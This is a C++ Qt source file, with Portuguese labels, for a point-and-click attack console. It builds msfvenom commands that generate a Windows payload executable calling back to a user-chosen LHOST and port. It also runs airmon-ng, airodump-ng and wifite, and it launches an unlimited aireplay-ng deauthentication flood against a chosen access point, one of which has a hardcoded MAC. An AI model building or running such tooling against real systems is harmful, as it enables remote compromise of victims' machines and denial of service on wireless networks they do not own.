#include "form.h"
#include "ui_form.h"
#include <QMessageBox>
#include <QProcess>

FORM::FORM(QWidget *parent) : QMainWindow(parent), ui(new Ui::FORM)
{
    ui->setupUi(this);
    ui->botaoAtaque->setEnabled(false);
    ui->buttonWifite->setEnabled(false);
}

FORM::~FORM()
{
    delete ui;
}

void FORM::on_pushButton_clicked()
{

    QString GirlsJustWantToHaveFun = ui->comboBox->currentText();
    QString hosts = ui->comboBox_2->currentText();
    QString porta = ui->lineEdit->text();
    ui->pushButton->setEnabled(false);
    QString comando="msfvenom -p " +GirlsJustWantToHaveFun+ " LHOST="+hosts+ " LPORT="+porta+ " -f exe -o /tmp/coisas.exe";
    ui->labelAvisosTextos->setText(comando);
    CyndiLooper(comando);
    QProcess::execute(comando);
    ui->labelAvisos->setText(comando);



}


void FORM::on_botaoAtaque_clicked()
{
    if(User() == "root"){
       QString placa = ui->comboPlacas->currentText();
       QString monitoreEm="wlan0mon";
       if(placa == "wlp2s0"){
           monitoreEm="wlp2s0mon";
       }
       QString bssid = ui->lineTextMacBSSID->text();
       bssid.replace(":","-");
       QString comando2 = executor + "aireplay-ng --deauth 0 -a " + bssid + " " + monitoreEm;
       QProcess::execute(comando2);
       ui->labelAvisosTextos->setText(comando2);
    }
    else{
        Alert("Você não é o root "+User());
    }
}

void FORM::on_butaoPrepare_clicked()
{
   if(User() == "root"){
     QString placa = ui->comboPlacas->currentText();
     QString monitoreEm="wlan0mon";
     if(placa == "wlp2s0"){
        monitoreEm="wlp2s0mon";
     }

     QString canal = ui->comboCanal->currentText();
     QString primeiroComandoPreparativo = executor+"airmon-ng check kill " + placa;
     QString segundoComandoPreparativo  = executor+"airodump-ng --channel " + canal + " " + monitoreEm;
     ui->labelAvisosTextos->setText(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(primeiroComandoPreparativo);
     QProcess::execute(executor + "airmon-ng start " + placa);
     QProcess::execute(segundoComandoPreparativo);
     ui->labelAvisos->setText(segundoComandoPreparativo);
     ui->labelAvisosTextos->setText(segundoComandoPreparativo);
     ui->botaoAtaque->setEnabled(true);
     ui->buttonWifite->setEnabled(true);
     ui->buttonAirodump->setEnabled(true);
   }
   else{
       Alert("Você não é o root "+User());
        ui->labelAvisosTextos->setText("Você não é o root");
   }
}

void FORM::on_buttonWifite_clicked()
{
    QProcess::execute(executor+"wifite");
}

void FORM::on_buttonAirodump_clicked()
{
    QString placa = ui->comboPlacas->currentText();
    QString monitoreEm="wlan0mon";
    if(placa == "wlp2s0"){
       monitoreEm="wlp2s0mon";
    }
     QString canal = ui->comboCanal->currentText();
     QString segundoComandoPreparativo  = executor+"airodump-ng --channel " + canal + " "+monitoreEm;
     QProcess::execute(segundoComandoPreparativo);
     ui->labelAvisosTextos->setText(segundoComandoPreparativo);
}

void FORM::on_radioButton_clicked()
{
    ui->lineTextMacBSSID->setText("66:64:20:0B:6E:C0");
}
